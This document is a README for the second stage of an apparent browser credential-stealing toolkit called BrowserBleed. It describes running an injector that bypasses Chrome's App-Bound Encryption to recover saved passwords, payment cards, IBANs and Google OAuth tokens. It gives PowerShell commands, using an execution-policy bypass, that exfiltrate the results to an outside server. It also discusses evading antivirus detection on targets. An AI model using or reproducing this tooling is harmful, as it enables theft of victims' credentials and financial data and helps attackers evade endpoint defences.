# Stage 2 — App-Bound Encryption extraction

`chromelevator` ([xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption), MIT) is a **distinct, separate stage** for the one thing the main BrowserBleed payload cannot do via CDP: recover **saved passwords, payment cards, IBANs, and Google OAuth tokens** that Chrome 127+ wraps in App-Bound Encryption.

## Why it's separate

`chromelevator` uses direct-syscall reflective process hollowing — one of the loudest behaviors an endpoint can flag. Keeping it out of the Nuitka payload isolates that noise from the quiet BrowserBleed binary.

- Stage 1 (`BrowserBleed`): cookies via CDP + memory tokens — low-signal.
- Stage 2 (`chromelevator`): passwords / cards / tokens via ABE bypass — high-signal, AV-flagged.

## Files

| File | Purpose |
|---|---|
| `chromelevator_x64.exe` | x64 injector (v0.20.0) |
| `chromelevator_arm64.exe` | ARM64 injector |
| `run_abe_stage.ps1` | runs the tool over all browsers + exfiltrates JSON to the report server |

## Usage

```powershell
$env:BB_EXFIL_URL = "https://browserbleed.lanarchy.net"
$env:BB_API_KEY   = "yJIB..."
powershell -ExecutionPolicy Bypass -File .\run_abe_stage.ps1
```

Or pass them inline:

```powershell
.\run_abe_stage.ps1 -ExfilUrl "https://browserbleed.lanarchy.net" -ApiKey "yJIB..."
```

Output is written to `%TEMP%\bb_abe\<Browser>\<Profile>\*.json` and POSTed to `/upload` as a report.

## ⚠️ AV caveat

`chromelevator_x64.exe` is detected by Windows Defender (it is a published post-exploitation technique). It will be quarantined on a normal target unless AV is handled separately. This is inherent to the ABE-password approach and is exactly why it is not baked into the payload.
